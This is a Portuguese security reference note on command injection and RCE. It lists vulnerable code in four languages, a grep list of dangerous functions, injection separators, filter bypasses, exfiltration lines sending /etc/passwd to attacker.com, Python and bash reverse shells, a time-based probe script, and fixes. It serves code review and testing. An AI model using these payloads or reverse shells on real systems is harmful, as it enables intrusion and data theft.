# Command Injection & RCE

**Tags:** #critico #rce #command-injection #exec #injecao
**OWASP:** A03:2021 — Injection
**CVSS Base:** 10.0 (Crítico máximo — RCE não-autenticado)

---

## 📖 O que é

Command Injection ocorre quando input do usuário é passado diretamente para funções de execução de sistema operacional sem sanitização.  
RCE (Remote Code Execution) é o resultado: o atacante executa comandos arbitrários no servidor.

---

## 🎯 Padrões de Código Vulnerável

### PHP
```php
// ❌ VULNERÁVEL
$output = shell_exec("ping " . $_GET['host']);
$result = system("ls " . $_POST['dir']);
$out = exec("convert " . $filename);
passthru("nmap " . $ip);
```

### Python
```python
# ❌ VULNERÁVEL — os.system passa para shell
import os
os.system("ping " + user_input)

# ❌ VULNERÁVEL — shell=True é o vetor
import subprocess
subprocess.run("ls " + path, shell=True)

# ❌ VULNERÁVEL — eval() com input externo
eval(user_code)
```

### Node.js
```javascript
// ❌ VULNERÁVEL
const { exec } = require('child_process');
exec('ls ' + req.query.dir, callback);

// ❌ VULNERÁVEL — eval com input
eval(req.body.code);
```

### Java
```java
// ❌ VULNERÁVEL
Runtime.getRuntime().exec("ping " + host);
Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
```

---

## 🔍 `grep_search` Táticas

```
exec(
system(
shell_exec(
passthru(
popen(
os.system(
subprocess.run(
subprocess.call(
subprocess.Popen(
child_process.exec(
eval(
Runtime.getRuntime()
ProcessBuilder
```

**Heurística crítica:** buscar `shell=True` em Python — é a flag que habilita interpretação de shell, necessária para Command Injection.

---

## 💣 Payloads de Confirmação

### Separadores de Comando
```bash
# Linux
; id
| id
|| id
& id
&& id
`id`
$(id)

# Windows
& whoami
| whoami
&& whoami
```

### Payloads de Exfiltração (OOB)
```bash
; curl http://attacker.com/?data=$(id)
; wget http://attacker.com/?o=$(cat /etc/passwd)
```

### Bypass de Filtros Simples
```bash
# Bypass com tabs e espaços alternativos
;{id}
;$IFS$9id
# Bypass de blacklist com quotes
;i""d
# Bypass de whitelist de IPs
127.0.0.1;id
localhost|id
```

### Reverse Shell (após confirmação do RCE)
```bash
# Python reverse shell
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Bash
;bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

---

## 🧪 Script de Validação Efêmero (`.tmp/`)

```python
# .tmp/validate_cmdi.py — DESCARTAR APÓS USO
import requests
import sys

TARGET = "http://target.com/api/ping"
PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "`sleep 5`",
    "$(sleep 5)"
]

for payload in PAYLOADS:
    import time
    start = time.time()
    try:
        r = requests.post(TARGET, data={"host": f"127.0.0.1{payload}"}, timeout=10)
        elapsed = time.time() - start
        if elapsed >= 4.5:
            print(f"[VULN] Time-based confirmed: {payload} (elapsed: {elapsed:.1f}s)")
        else:
            print(f"[safe] {payload} (elapsed: {elapsed:.1f}s)")
    except Exception as e:
        print(f"[ERROR] {e}")
```

---

## 🛡️ Correção

```python
# ✅ CORRETO — lista de argumentos, sem shell=True
import subprocess
result = subprocess.run(["ping", "-c", "4", host], capture_output=True, text=True)

# ✅ CORRETO — whitelist explícita
ALLOWED_HOSTS = ["8.8.8.8", "1.1.1.1"]
if host not in ALLOWED_HOSTS:
    raise ValueError("Host não permitido")
```

```php
// ✅ CORRETO — escapeshellarg()
$safe_host = escapeshellarg($_GET['host']);
$output = shell_exec("ping -c 4 " . $safe_host);
```

**Regra de ouro:** nunca usar `shell=True` (Python) ou construir strings de comando com input externo. Sempre usar listas de argumentos.

---

## 🔗 Chain Exploits

```
RCE → Reverse Shell → Acesso ao servidor completo
RCE + Container sem USER restrito → fuga de container via /proc/1/root
RCE + /etc/passwd legível → enumeração de usuários para pivô
Command Injection em script de backup → RCE agendado invisível
```

---

## 📌 Referências
- [[PEI — Protocolo de Investigação Exploratória]]
- [[IaC Security — Docker Kubernetes Terraform]]
- [[Matriz de Severidade]]
